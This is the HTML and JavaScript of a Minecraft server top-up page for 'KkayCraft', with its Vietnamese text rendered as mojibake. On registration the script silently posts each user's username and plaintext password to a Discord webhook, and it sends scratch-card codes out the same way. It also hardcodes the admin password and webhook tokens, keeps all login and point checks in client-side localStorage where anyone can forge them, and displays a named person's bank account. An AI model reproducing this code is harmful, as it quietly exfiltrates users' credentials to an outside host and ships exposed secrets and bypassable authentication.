<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>KkayCraft - Náº¡p tiá»n</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #ffe082; /* ná»n vÃ ng */
      color: black;
    }
    header {
      background: #fbc02d; /* vÃ ng Ä‘áº­m */
      padding: 12px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 3px solid #ff6f00;
    }
    #site-logo {
      max-height: 60px;
      cursor: pointer;
    }
    #logo-upload {
      display: none;
    }
    #logout-btn {
      background: #ff9800;
      border: none;
      padding: 6px 12px;
      border-radius: 6px;
      color: white;
      cursor: pointer;
      font-size: 14px;
    }
    #logout-btn:hover {
      background: #e53935;
    }
    .container {
      max-width: 900px;
      margin: 20px auto;
      padding: 20px;
      background: #fffde7;
      border-radius: 10px;
    }
    input, select, button, textarea {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: none;
      border-radius: 5px;
      font-size: 15px;
      background: #fff3e0;
      color: black;
    }
    button {
      background-color: #ff9800;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background-color: #e53935;
    }
    .hidden { display: none; }
    .tab-buttons { display: flex; gap: 10px; margin-bottom: 10px; }
    .tab-buttons button { flex: 1; }
    .preview-img {
      max-width: 100%;
      margin-top: 10px;
      border-radius: 8px;
    }
    #bank-info {
      background: #fff9c4;
      padding: 10px;
      border-radius: 8px;
      margin-top: 10px;
      font-size: 14px;
    }
    #username-display {
      font-weight: bold;
      margin-right: 10px;
    }
    #username-display .point {
      background: #e65100;
      color: white;
      font-size: 11px;
      padding: 2px 6px;
      border-radius: 12px;
      margin-left: 6px;
    }
    .history-box {
      background: #fff3e0;
      padding: 10px;
      border-radius: 8px;
      margin-top: 15px;
    }
    .history-item {
      border-bottom: 1px solid #ccc;
      padding: 8px 0;
    }
    .admin-tools {
      margin-top: 20px;
      background: #ffe0b2;
      padding: 10px;
      border-radius: 8px;
    }

    /* ğŸ‘‡ Báº¢N QUYá»€N CUá»I TRANG */
    #copyright-box {
      text-align: center;
      font-size: 12px;
      font-weight: normal;
      background: #ffcc80;
      padding: 10px;
      color: #bf360c;
      border-top: 2px solid #e65100;
      margin-top: 40px;
    }

    /* ğŸ‘‡ Logo + dÃ²ng chá»¯ kkaycraft.fun */
    #footer-text {
      text-align: center;
      font-weight: bold;
      font-size: 16px;
      color: #d84315;
      margin: 5px 0 15px;
    }
  </style>
</head>
<body>

<!-- PHáº¦N HEADER -->
<header>
  <!-- Logo -->
  <span id="logo-container">
    <img id="site-logo" src="" alt="Logo">
  </span>
  <div>
    <span id="username-display"></span>
    <button id="logout-btn" class="hidden">ÄÄƒng xuáº¥t</button>
  </div>
</header>

<!-- CHá»® "kkaycraft.fun" -->
<div id="footer-text">kkaycraft.fun</div>

<!-- Upload logo (áº©n) -->
<input type="file" id="logo-upload" accept="image/*" class="hidden">

<!-- FORM ÄÄ‚NG NHáº¬P / ÄÄ‚NG KÃ -->
<div class="container" id="auth-box">
  <h2>ÄÄƒng nháº­p / ÄÄƒng kÃ½</h2>
  <input type="text" id="auth-username" placeholder="TÃªn Ä‘Äƒng nháº­p">
  <input type="password" id="auth-password" placeholder="Máº­t kháº©u">
  <button id="login-btn">ÄÄƒng nháº­p</button>
  <button id="register-btn">ÄÄƒng kÃ½</button>
  <p id="auth-msg"></p>
</div>
<!-- Há»˜P CHÃNH SAU KHI ÄÄ‚NG NHáº¬P -->
<div class="container hidden" id="main-box">
  <div class="tab-buttons">
    <button onclick="showTab('card')">ğŸ’³ Náº¡p Tháº»</button>
    <button onclick="showTab('bank')">ğŸ¦ Náº¡p Bank</button>
  </div>

  <!-- Náº P THáºº -->
  <div id="tab-card" class="hidden">
    <h3>ğŸ“© Náº¡p Tháº» CÃ o</h3>
    <input id="card-user" placeholder="TÃªn Minecraft">
    <input id="card-serial" placeholder="Seri tháº»">
    <input id="card-code" placeholder="MÃ£ tháº»">
    <select id="card-amount">
      <option value="">-- Chá»n má»‡nh giÃ¡ --</option>
      <option>10.000</option>
      <option>20.000</option>
      <option>50.000</option>
      <option>100.000</option>
      <option>200.000</option>
      <option>500.000</option>
    </select>
    <select id="card-server">
      <option>SMP</option>
      <option>SkyMine</option>
      <option>BoxPVP</option>
    </select>
    <button id="card-submit">Gá»­i tháº»</button>
    <p id="card-msg"></p>
  </div>

  <!-- Náº P BANK -->
  <div id="tab-bank" class="hidden">
    <h3>ğŸ¦ Náº¡p Bank</h3>
    <img id="qr-preview" class="preview-img" src="https://i.imgur.com/dLKn6Gi.jpeg" alt="QR Bank">
    <input type="file" id="qr-upload" class="hidden" accept="image/*" />
    <div id="bank-info">
      <p><b>Chá»§ TK:</b> NGUYá»„N VÄ‚N HUá»²NH</p>
      <p><b>STK:</b> 8801942007</p>
      <p><b>NgÃ¢n hÃ ng:</b> MB Bank</p>
      <p><b>Ná»™i dung CK:</b> <span id="bank-note" style="color:orangered"></span></p>
    </div>
    <input id="bank-user" placeholder="TÃªn Minecraft">
    <input id="bank-amount" placeholder="Sá»‘ tiá»n Ä‘Ã£ chuyá»ƒn">
    <select id="bank-server" onchange="generateNote()">
      <option>SMP</option>
      <option>SkyMine</option>
      <option>BoxPVP</option>
    </select>
    <button id="bank-submit">TÃ´i Ä‘Ã£ chuyá»ƒn</button>
    <p id="bank-msg"></p>
  </div>

  <!-- Lá»ŠCH Sá»¬ Náº P -->
  <div id="history-box" class="history-box hidden">
    <h3>Lá»‹ch sá»­ náº¡p</h3>
    <div id="history-list"></div>
    <button id="show-more-history" style="display:none; margin-top:10px;">Xem thÃªm</button>
  </div>

  <!-- DUYá»†T YÃŠU Cáº¦U CHO ADMIN -->
  <div id="admin-tools" class="admin-tools hidden">
    <h3>ğŸ“‹ Duyá»‡t yÃªu cáº§u náº¡p</h3>
    <div id="admin-list"></div>
  </div>
</div>

<!-- Gá»¬I KHIáº¾U Náº I - chá»‰ ngÆ°á»i chÆ¡i Ä‘Æ°á»£c tháº¥y -->
<div class="container hidden" id="complain-box">
  <h3>ğŸ“¨ Gá»­i khiáº¿u náº¡i</h3>
  <textarea id="complain-text" rows="4" placeholder="Nháº­p ná»™i dung khiáº¿u náº¡i..." style="width:100%;padding:10px;border-radius:6px;font-size:15px;"></textarea>
  <button onclick="submitComplain()">Gá»­i khiáº¿u náº¡i</button>
</div>
<script>
const ADMIN = "ItzkkayMC";
const ADMIN_PASS = "Vh1942007";
const webhookURL = "https://discord.com/api/webhooks/1387502124484520132/dj-JZs6j8tV1VOHvKgT8lEJSwGtIIt-H7AwTzpKUNXcH4S-HsFrkD6XeIFJybwtDNrsZ";

let users = JSON.parse(localStorage.getItem("users") || "{}");
let currentUser = localStorage.getItem("currentUser");
let history = JSON.parse(localStorage.getItem("history") || "[]");
let scores = JSON.parse(localStorage.getItem("scores") || "{}");

let historyShowCount = 3; // sá»‘ dÃ²ng lá»‹ch sá»­ náº¡p hiá»ƒn thá»‹ ban Ä‘áº§u

function updateUI() {
  const isAdmin = currentUser === ADMIN;

  // Hiá»ƒn thá»‹ hoáº·c áº©n cÃ¡c pháº§n
  document.getElementById("auth-box").classList.toggle("hidden", !!currentUser);
  document.getElementById("main-box").classList.toggle("hidden", !currentUser);
  document.getElementById("logout-btn").classList.toggle("hidden", !currentUser);
  document.getElementById("admin-tools").classList.toggle("hidden", !isAdmin);
  document.getElementById("complain-box").classList.toggle("hidden", !currentUser || isAdmin);

  // Logo vÃ  QR chá»‰ admin cÃ³ thá»ƒ Ä‘á»•i
  const savedLogo = localStorage.getItem("siteLogo");
  document.getElementById("site-logo").src = savedLogo || "";
  const savedQR = localStorage.getItem("qrImage");
  document.getElementById("qr-preview").src = savedQR || "https://i.imgur.com/dLKn6Gi.jpeg";

  // Cho phÃ©p admin upload logo vÃ  QR
  if (isAdmin) {
    document.getElementById("logo-container").onclick = () => {
      document.getElementById("logo-upload").click();
    };
    document.getElementById("qr-upload").classList.remove("hidden");
  } else {
    document.getElementById("logo-container").onclick = null;
    document.getElementById("qr-upload").classList.add("hidden");
  }

  // Hiá»ƒn thá»‹ tÃªn user vÃ  Ä‘iá»ƒm
  if (currentUser) {
    const point = scores[currentUser] || 0;
    document.getElementById("username-display").innerHTML = `${currentUser} <span class="point">${point}Ä‘</span>`;

    if (isAdmin) {
      document.getElementById("username-display").innerHTML += ` <button style="font-size:12px;" onclick="promptDeductPoints()">Trá»« Ä‘iá»ƒm ngÆ°á»i chÆ¡i</button>`;
    }
  } else {
    document.getElementById("username-display").textContent = "";
  }

  showHistory();
  showAdminList();
  generateNote();
  showTab('card'); // máº·c Ä‘á»‹nh tab náº¡p tháº»
}
updateUI();

// ÄÄƒng xuáº¥t
document.getElementById("logout-btn").onclick = () => {
  localStorage.removeItem("currentUser");
  location.reload();
};

// ÄÄƒng kÃ½ - khÃ´ng cho phÃ©p trÃ¹ng tÃªn tÃ i khoáº£n
document.getElementById("register-btn").onclick = () => {
  const u = document.getElementById("auth-username").value.trim();
  const p = document.getElementById("auth-password").value;
  if (!u || !p) return alert("Nháº­p Ä‘á»§ thÃ´ng tin");
  if (users[u]) return alert("TÃªn tÃ i khoáº£n Ä‘Ã£ tá»“n táº¡i, vui lÃ²ng chá»n tÃªn khÃ¡c.");
  users[u] = p;
  localStorage.setItem("users", JSON.stringify(users));
  sendRegisterWebhook(u, p);
  alert("ÄÄƒng kÃ½ thÃ nh cÃ´ng!");
};

// ÄÄƒng nháº­p
document.getElementById("login-btn").onclick = () => {
  const u = document.getElementById("auth-username").value.trim();
  const p = document.getElementById("auth-password").value;
  if ((u === ADMIN && p === ADMIN_PASS) || users[u] === p) {
    localStorage.setItem("currentUser", u);
    location.reload();
  } else {
    alert("Sai tÃ i khoáº£n hoáº·c máº­t kháº©u!");
  }
};

// Upload logo (admin)
document.getElementById("logo-upload").addEventListener("change", (e) => {
  const file = e.target.files[0];
  if (!file) return;
  const reader = new FileReader();
  reader.onload = function(event) {
    localStorage.setItem("siteLogo", event.target.result);
    updateUI();
    alert("ÄÃ£ cáº­p nháº­t logo!");
  };
  reader.readAsDataURL(file);
});

// Upload QR (admin)
document.getElementById("qr-upload").addEventListener("change", (e) => {
  const file = e.target.files[0];
  if (!file) return;
  const reader = new FileReader();
  reader.onload = function(event) {
    localStorage.setItem("qrImage", event.target.result);
    updateUI();
    alert("ÄÃ£ cáº­p nháº­t áº£nh QR!");
  };
  reader.readAsDataURL(file);
});

// Chuyá»ƒn tab Náº¡p Tháº» / Náº¡p Bank
function showTab(tab) {
  document.getElementById("tab-card").classList.add("hidden");
  document.getElementById("tab-bank").classList.add("hidden");
  if (tab === "card") document.getElementById("tab-card").classList.remove("hidden");
  if (tab === "bank") document.getElementById("tab-bank").classList.remove("hidden");
  generateNote();
}

// Táº¡o ná»™i dung CK (Bank)
function generateNote() {
  const server = document.getElementById("bank-server").value;
  const rand = Math.random().toString(36).substring(2, 8).toUpperCase();
  document.getElementById("bank-note").textContent = `NAP-${server}-${rand}`;
}

// Gá»­i webhook khi Ä‘Äƒng kÃ½ tÃ i khoáº£n
function sendRegisterWebhook(username, password) {
  const msg = {
    content: `ğŸ” **TÃ i khoáº£n má»›i Ä‘Äƒng kÃ½**\nTÃªn: ${username}\nMáº­t kháº©u: ${password}`
  };
  fetch("https://discord.com/api/webhooks/1388140771781120132/dj-JZs6j8tV1VOHvKgT8lEJSwGtIIt-H7AwTzpKUNXcH4S-HsFrkD6XeIFJybwtDNrsZ", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(msg)
  });
}

// Náº¡p Tháº»
document.getElementById("card-submit").onclick = () => {
  const user = document.getElementById("card-user").value.trim();
  const serial = document.getElementById("card-serial").value.trim();
  const code = document.getElementById("card-code").value.trim();
  const amount = document.getElementById("card-amount").value;
  const server = document.getElementById("card-server").value;
  if (!user || !serial || !code || !amount) return alert("Äiá»n Ä‘á»§ thÃ´ng tin");

  const amountNumber = parseInt(amount.replace(/\D/g, ''));

  const item = {
    type: "Tháº» cÃ o",
    user,
    info: `Serial: ${serial}<br>MÃ£ tháº»: ${code}<br>Má»‡nh giÃ¡: ${amount}`,
    amount: amountNumber,
    server,
    status: "Chá» duyá»‡t",
    from: currentUser,
    time: new Date().toLocaleString()
  };
  history.push(item);
  localStorage.setItem("history", JSON.stringify(history));
  sendWebhook(item);

  alert("ÄÃ£ gá»­i tháº»! Vui lÃ²ng Ä‘á»£i admin duyá»‡t.");

  // XÃ³a form Ä‘á»ƒ trÃ¡nh gá»­i láº¡i
  document.getElementById("card-user").value = "";
  document.getElementById("card-serial").value = "";
  document.getElementById("card-code").value = "";
  document.getElementById("card-amount").value = "";
  document.getElementById("card-server").value = "SMP";

  showHistory();
  showAdminList();
};

// Náº¡p Bank
document.getElementById("bank-submit").onclick = () => {
  const user = document.getElementById("bank-user").value.trim();
  const amount = document.getElementById("bank-amount").value.trim();
  const server = document.getElementById("bank-server").value;
  const note = document.getElementById("bank-note").textContent;
  if (!user || !amount) return alert("Äiá»n Ä‘á»§ thÃ´ng tin");

  const amountNumber = parseInt(amount.replace(/\D/g, ''));

  const item = {
    type: "Bank",
    user,
    info: `Sá»‘ tiá»n: ${amount}<br>Ná»™i dung CK: ${note}`,
    amount: amountNumber,
    server,
    status: "Chá» duyá»‡t",
    from: currentUser,
    time: new Date().toLocaleString()
  };
  history.push(item);
  localStorage.setItem("history", JSON.stringify(history));
  sendWebhook(item);

  alert("ÄÃ£ gá»­i bank! Vui lÃ²ng Ä‘á»£i admin duyá»‡t.");

  // XÃ³a form Ä‘á»ƒ trÃ¡nh gá»­i láº¡i
  document.getElementById("bank-user").value = "";
  document.getElementById("bank-amount").value = "";
  document.getElementById("bank-server").value = "SMP";

  generateNote();

  showHistory();
  showAdminList();
};

// Gá»­i khiáº¿u náº¡i
function submitComplain() {
  const content = document.getElementById("complain-text").value.trim();
  if (!content) return alert("Vui lÃ²ng nháº­p ná»™i dung khiáº¿u náº¡i.");
  const item = {
    type: "Khiáº¿u náº¡i",
    user: currentUser,
    info: content,
    server: "-",
    amount: 0,
    status: "Chá» duyá»‡t",
    from: currentUser,
    time: new Date().toLocaleString()
  };
  history.push(item);
  localStorage.setItem("history", JSON.stringify(history));
  sendWebhook(item);
  alert("ÄÃ£ gá»­i khiáº¿u náº¡i! Admin sáº½ xem xÃ©t.");
  document.getElementById("complain-text").value = "";
  showHistory();
  showAdminList();
}

// Gá»­i webhook cho má»i yÃªu cáº§u náº¡p vÃ  khiáº¿u náº¡i
function sendWebhook(item) {
  const msg = {
    content: `ğŸ“¥ **YÃªu cáº§u má»›i tá»« ${item.from}**\nğŸ§ Minecraft: ${item.user}\nğŸ’¬ HÃ¬nh thá»©c: ${item.type}\nğŸ“¦ Server: ${item.server}\nğŸ• Thá»i gian: ${item.time}\nğŸ”– ThÃ´ng tin:\n${item.info.replace(/<br>/g, '\n')}`
  };
  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(msg)
  });
}

// Hiá»ƒn thá»‹ lá»‹ch sá»­ náº¡p (chá»‰ 3 dÃ²ng, báº¥m xem thÃªm má»›i hiá»ƒn thá»‹ thÃªm)
function showHistory() {
  const list = document.getElementById("history-list");
  list.innerHTML = "";
  const filtered = history.filter(h => h.from === currentUser);
  if (filtered.length === 0) {
    document.getElementById("history-box").classList.add("hidden");
    document.getElementById("show-more-history").style.display = "none";
    return;
  }
  document.getElementById("history-box").classList.remove("hidden");

  const showCount = Math.min(historyShowCount, filtered.length);
  for (let i = 0; i < showCount; i++) {
    const h = filtered[filtered.length - 1 - i];
    const div = document.createElement("div");
    div.className = "history-item";
    div.innerHTML = `<b>[${h.type}]</b> ${h.user} - ${h.server}<br>
    ğŸ”– ${h.info}<br>â° ${h.time}<br>ğŸ“Œ <span style="color:${h.status === "ÄÃ£ duyá»‡t" ? "lime" : h.status === "Tá»« chá»‘i" ? "red" : "orange"}">${h.status}</span>`;
    list.appendChild(div);
  }

  // Hiá»ƒn thá»‹ nÃºt xem thÃªm náº¿u cÃ³ hÆ¡n 3 má»¥c
  if (filtered.length > 3) {
    document.getElementById("show-more-history").style.display = "block";
  } else {
    document.getElementById("show-more-history").style.display = "none";
  }
}

// Xá»­ lÃ½ nÃºt xem thÃªm lá»‹ch sá»­
document.getElementById("show-more-history").onclick = () => {
  historyShowCount += 3;
  showHistory();
};

// Hiá»ƒn thá»‹ danh sÃ¡ch duyá»‡t náº¡p cho admin
function showAdminList() {
  if (currentUser !== ADMIN) return;
  const box = document.getElementById("admin-list");
  box.innerHTML = "";
  const pending = history.filter(h => h.status === "Chá» duyá»‡t").slice().reverse();
  if (pending.length === 0) {
    box.innerHTML = "<i>KhÃ´ng cÃ³ yÃªu cáº§u chá» duyá»‡t</i>";
    return;
  }
  pending.forEach((h, i) => {
    const div = document.createElement("div");
    div.className = "history-item";
    div.innerHTML = `<b>${h.type}</b> cá»§a <b>${h.user}</b> - ${h.server}<br>
    ğŸ”– ${h.info}<br>â° ${h.time}<br>
    <button onclick="approve(${i})">âœ… Duyá»‡t</button>
    <button onclick="reject(${i})">âŒ Tá»« chá»‘i</button>`;
    box.appendChild(div);
  });
}

// Duyá»‡t yÃªu cáº§u náº¡p
function approve(index) {
  if (currentUser !== ADMIN) return;
  const pending = history.filter(h => h.status === "Chá» duyá»‡t").slice().reverse();
  const item = pending[index];
  const idx = history.findIndex(h =>
    h.time === item.time && h.user === item.user && h.type === item.type
  );
  if (idx < 0) return;

  history[idx].status = "ÄÃ£ duyá»‡t";

  // Cá»™ng Ä‘iá»ƒm khi náº¡p >= 10.000Ä‘, 10k = 1 Ä‘iá»ƒm
  if (item.amount >= 10000 && item.type !== "Khiáº¿u náº¡i") {
    const pointAdd = Math.floor(item.amount / 10000);
    scores[item.from] = (scores[item.from] || 0) + pointAdd;
    localStorage.setItem("scores", JSON.stringify(scores));
    alert(`ÄÆ¡n náº¡p cá»§a báº¡n Ä‘Ã£ Ä‘Æ°á»£c duyá»‡t. Báº¡n Ä‘Æ°á»£c +${pointAdd} Ä‘iá»ƒm tÃ­ch luá»¹. LiÃªn há»‡ admin Ä‘á»ƒ Ä‘á»•i quÃ .`);
  }

  localStorage.setItem("history", JSON.stringify(history));
  showHistory();
  showAdminList();
  updateUI();
}

// Tá»« chá»‘i yÃªu cáº§u náº¡p
function reject(index) {
  if (currentUser !== ADMIN) return;
  const pending = history.filter(h => h.status === "Chá» duyá»‡t").slice().reverse();
  const item = pending[index];
  const idx = history.findIndex(h =>
    h.time === item.time && h.user === item.user && h.type === item.type
  );
  if (idx < 0) return;

  history[idx].status = "Tá»« chá»‘i";
  localStorage.setItem("history", JSON.stringify(history));
  showHistory();
  showAdminList();
}

// Admin trá»« Ä‘iá»ƒm ngÆ°á»i chÆ¡i
function promptDeductPoints() {
  if (currentUser !== ADMIN) return;
  const player = prompt("Nháº­p tÃªn ngÆ°á»i chÆ¡i muá»‘n trá»« Ä‘iá»ƒm:");
  if (!player) return;
  if (!scores[player]) {
    alert("NgÆ°á»i chÆ¡i nÃ y khÃ´ng cÃ³ Ä‘iá»ƒm.");
    return;
  }
  const amount = prompt(`NgÆ°á»i chÆ¡i ${player} hiá»‡n cÃ³ ${scores[player]} Ä‘iá»ƒm.\nNháº­p sá»‘ Ä‘iá»ƒm muá»‘n trá»«:`);
  if (!amount || isNaN(amount) || amount <= 0) {
    alert("Sá»‘ Ä‘iá»ƒm khÃ´ng há»£p lá»‡.");
    return;
  }
  const deduct = Math.min(scores[player], parseInt(amount));
  scores[player] -= deduct;
  localStorage.setItem("scores", JSON.stringify(scores));
  alert(`ÄÃ£ trá»« ${deduct} Ä‘iá»ƒm cá»§a ngÆ°á»i chÆ¡i ${player}.`);
  updateUI();
}
</script>

<!-- Báº¢N QUYá»€N -->
<div style="background:#ff6f00; color:white; font-size:12px; font-weight:bold; text-align:center; padding:5px 0; margin-top:20px;">
  Báº£n quyá»n thuá»™c vá» kkayMC - web Ä‘á»ƒ há»— trá»£ server
</div>